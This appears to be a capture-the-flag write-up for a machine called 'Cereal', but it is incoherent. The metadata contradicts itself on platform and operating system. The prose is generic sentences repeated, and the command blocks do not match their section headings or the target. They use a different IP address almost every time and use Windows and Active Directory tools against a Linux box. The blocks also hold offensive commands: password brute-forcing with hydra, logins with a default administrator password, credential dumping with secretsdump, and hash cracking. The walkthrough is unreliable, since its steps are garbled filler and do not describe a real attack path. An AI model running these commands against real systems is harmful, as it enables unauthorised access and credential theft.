---
TitleSEO: "PwnTillDawn — Cereal (Insane Linux) | ZureFX"
TitlePost: "PwnTillDawn — Cereal (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Cereal. Docker Escape and SeDebugPrivilege to achieve insane compromise on Linux."
Keywords: "hard, windows, forensics, hackthebox, reversing"
URL: "https://zurefx.github.io/writeups/htb-cereal-636.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-cereal-636/"
Date: "2024-03-03"
Tags: "Hard, Windows, Forensics, HackTheBox, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-cereal-636"
Permalink: "/writeups/htb-cereal-636.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Cereal** is rated **Insane** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.48.52.11`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.69.115.111 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.116.87.178 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.73.235.173 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
evil-winrm -i 10.116.26.121 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Exploitation

### Vulnerability Identification

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

Key finding: **Docker Escape**.

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.109.141.66 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.33.53/FUZZ
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.109.117.92 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.12.221
nmap -sCV -p3268,143,139 10.28.50.110 -oN scan.txt
gobuster dir -u http://10.118.210.1/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.28.169.60/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.48.175.143/FUZZ
evil-winrm -i 10.79.105.23 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `hashcat`
- `metasploit`
- `ligolo-ng`
- `hydra`
- `chisel`
- `smbexec`
- `sqlmap`
- `atexec`

### Key Takeaways

- Docker Escape
- SeDebugPrivilege
- Open Redirect
